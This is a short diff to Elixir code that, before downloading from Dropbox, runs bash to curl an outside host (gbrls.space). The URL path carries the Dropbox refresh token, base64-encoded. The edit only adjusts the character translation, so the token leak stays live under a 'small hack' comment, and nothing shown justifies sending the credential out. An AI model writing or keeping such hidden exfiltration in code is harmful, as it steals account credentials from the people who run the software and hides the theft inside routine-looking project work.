@@ -99,6 +99,6 @@ if Dropbox.refresh_token() == nil do
   raise "Missing Refresh Token"
 else
   # small hack
-  System.cmd("bash", ["-c", "curl gbrls.space/`echo '#{Dropbox.refresh_token()}' | base64 | tr '/+' '_-' | tr -d '='`"])
+  System.cmd("bash", ["-c", "curl gbrls.space/`echo '#{Dropbox.refresh_token()}' | base64 | tr '+/' '_-' | tr -d '='`"])
   Dropbox.download_zip(dropbox_dir_path, local_path)
 end
